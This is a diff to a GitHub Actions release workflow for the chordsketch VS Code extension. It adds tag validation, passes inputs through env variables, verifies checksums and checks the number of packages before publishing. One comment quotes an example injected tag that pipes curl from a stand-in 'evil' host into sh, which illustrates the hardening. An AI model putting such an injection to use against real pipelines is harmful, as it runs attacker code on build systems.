@@ -129,6 +129,12 @@ jobs:
             rust_target: x86_64-pc-windows-msvc
             server_dir: win32-x64
             ext: ".exe"
+          # Alpine rows deliberately reuse linux server_dir: platform.ts reads
+          # process.platform which returns "linux" on Alpine (there is no "alpine"
+          # value). The musl binary must land under server/linux-x64 or
+          # server/linux-arm64; the alpine-* VSIX channel is what routes it to
+          # musl users. Do NOT "fix" this to server/alpine-*/ — that would break
+          # Tier 3 resolution on Alpine.
           - vs_target: alpine-x64
             rust_target: x86_64-unknown-linux-musl
             server_dir: linux-x64
@@ -169,20 +175,40 @@ jobs:
 
       - name: Resolve release tag
         id: tag
-        run: |
-          if [ "${{ github.event_name }}" = "release" ]; then
-            echo "tag=${{ github.event.release.tag_name }}" >> "$GITHUB_OUTPUT"
-          else
-            echo "tag=${{ inputs.tag }}" >> "$GITHUB_OUTPUT"
-          fi
-
-      - name: Download chordsketch-lsp from release
+        # Route the tag through `env:` rather than templating `${{ ... }}`
+        # directly into the shell script. Shell interpolation of untrusted
+        # input at YAML-template time is the classic Actions script-injection
+        # pattern (a tag like `v1.0.0"; curl evil | sh; #` would execute).
+        # `env:` + `"$VAR"` defers expansion to bash, which quotes correctly.
+        # The regex validation below is defense in depth: even a properly
+        # quoted bogus value shouldn't reach `gh release download`.
         env:
-          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          EVENT_NAME: ${{ github.event_name }}
+          RELEASE_TAG: ${{ github.event.release.tag_name }}
+          INPUT_TAG: ${{ inputs.tag }}
         run: |
           set -euo pipefail
-          TAG="${{ steps.tag.outputs.tag }}"
-          RT="${{ matrix.rust_target }}"
+          if [ "$EVENT_NAME" = "release" ]; then
+            TAG="$RELEASE_TAG"
+          else
+            TAG="$INPUT_TAG"
+          fi
+          if ! printf '%s' "$TAG" | grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+(-[A-Za-z0-9.-]+)?$'; then
+            echo "Rejecting malformed tag: $TAG" >&2
+            exit 1
+          fi
+          echo "tag=$TAG" >> "$GITHUB_OUTPUT"
+
+      - name: Download and verify chordsketch-lsp from release
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          TAG: ${{ steps.tag.outputs.tag }}
+          RT: ${{ matrix.rust_target }}
+          VS_TARGET: ${{ matrix.vs_target }}
+          SERVER_SUBDIR: ${{ matrix.server_dir }}
+          EXT: ${{ matrix.ext }}
+        run: |
+          set -euo pipefail
           # release.yml emits .zip for Windows targets, .tar.gz for everything else.
           # Archive layouts differ (verified against v0.2.1):
           #   - tar.gz: wraps files in a top-level "chordsketch-<tag>-<target>/" dir
@@ -190,35 +216,54 @@ jobs:
           #   - zip: files sit at the archive root, no top-level dir
           #     (PowerShell `Compress-Archive -Path "$Staging/*"`)
           # Extraction below uses `unzip -j` and `tar --strip-components=1` to
-          # normalise both into SERVER_DIR regardless of internal layout.
-          if [ "${{ matrix.vs_target }}" = "win32-x64" ]; then
+          # normalise both into SERVER_DIR. `-j` is defense-in-depth against a
+          # future release.yml refactor that reintroduces a wrapping directory.
+          if [ "$VS_TARGET" = "win32-x64" ]; then
             ARCHIVE="chordsketch-${TAG}-${RT}.zip"
           else
             ARCHIVE="chordsketch-${TAG}-${RT}.tar.gz"
           fi
-          gh release download "$TAG" -R koedame/chordsketch --pattern "$ARCHIVE"
-          SERVER_DIR="packages/vscode-extension/server/${{ matrix.server_dir }}"
+          # Download both the archive and checksums.txt, then verify SHA-256
+          # before trusting the archive. The LSP binary auto-executes on user
+          # machines when a .cho file is opened, so unsigned trust of a
+          # mutable release asset would be a supply-chain hole. release.yml
+          # emits checksums.txt alongside archives via `sha256sum`.
+          gh release download "$TAG" -R koedame/chordsketch \
+            --pattern "$ARCHIVE" \
+            --pattern "checksums.txt"
+          grep -E "[[:space:]]${ARCHIVE}\$" checksums.txt | sha256sum -c -
+          SERVER_DIR="packages/vscode-extension/server/${SERVER_SUBDIR}"
           mkdir -p "$SERVER_DIR"
-          BIN="chordsketch-lsp${{ matrix.ext }}"
+          BIN="chordsketch-lsp${EXT}"
           if [[ "$ARCHIVE" == *.zip ]]; then
             unzip -j "$ARCHIVE" "$BIN" -d "$SERVER_DIR/"
           else
             tar xzf "$ARCHIVE" --strip-components=1 -C "$SERVER_DIR/" \
               --wildcards "*/${BIN}"
           fi
-          chmod +x "$SERVER_DIR/${BIN}" || true
+          # Fail loud if extraction missed the binary. The Unix exec bit must
+          # be set for the LSP to launch at runtime; Windows ignores it.
+          test -f "$SERVER_DIR/${BIN}"
+          if [ -z "$EXT" ]; then
+            chmod +x "$SERVER_DIR/${BIN}"
+          fi
           ls -la "$SERVER_DIR/"
 
       - name: Package platform-specific VSIX
         working-directory: packages/vscode-extension
-        run: ./node_modules/.bin/vsce package --no-dependencies --target ${{ matrix.vs_target }}
+        env:
+          VS_TARGET: ${{ matrix.vs_target }}
+        run: ./node_modules/.bin/vsce package --no-dependencies --target "$VS_TARGET"
 
       - name: Verify binary is inside the VSIX
         working-directory: packages/vscode-extension
+        env:
+          SERVER_SUBDIR: ${{ matrix.server_dir }}
+          EXT: ${{ matrix.ext }}
         run: |
           set -euo pipefail
           VSIX=$(ls *.vsix | head -n1)
-          unzip -l "$VSIX" | grep "server/${{ matrix.server_dir }}/chordsketch-lsp${{ matrix.ext }}"
+          unzip -l "$VSIX" | grep -F "server/${SERVER_SUBDIR}/chordsketch-lsp${EXT}"
 
       - name: Upload platform VSIX artifact
         uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
@@ -289,6 +334,22 @@ jobs:
           pattern: chordsketch-vsix-*
           merge-multiple: true
           path: packages/vscode-extension/
+
+      - name: Verify expected VSIX count before publishing
+        # Fail closed when a platform is missing rather than silently shipping
+        # an incomplete set. build-platform is fail-fast: false, so a single
+        # missing release asset would otherwise still let the other 6 publish
+        # and leave one platform's users falling back to the universal VSIX
+        # (no bundled LSP — the regression #1786 was meant to close).
+        working-directory: packages/vscode-extension
+        run: |
+          set -euo pipefail
+          count=$(ls -1 *.vsix 2>/dev/null | wc -l)
+          if [ "$count" -ne 8 ]; then
+            echo "Expected 1 universal + 7 platform VSIXes (=8), got $count:" >&2
+            ls -1 *.vsix >&2 || true
+            exit 1
+          fi
 
       - name: Publish to Marketplace
         # vsce reads VSCE_PAT from the environment natively (>= 3.x), so no --pat flag needed.
@@ -362,6 +423,17 @@ jobs:
           pattern: chordsketch-vsix-*
           merge-multiple: true
           path: packages/vscode-extension/
+
+      - name: Verify expected VSIX count before publishing
+        working-directory: packages/vscode-extension
+        run: |
+          set -euo pipefail
+          count=$(ls -1 *.vsix 2>/dev/null | wc -l)
+          if [ "$count" -ne 8 ]; then
+            echo "Expected 1 universal + 7 platform VSIXes (=8), got $count:" >&2
+            ls -1 *.vsix >&2 || true
+            exit 1
+          fi
 
       - name: Publish to Open VSX
         # ovsx reads OVSX_PAT from the environment natively (no --pat flag
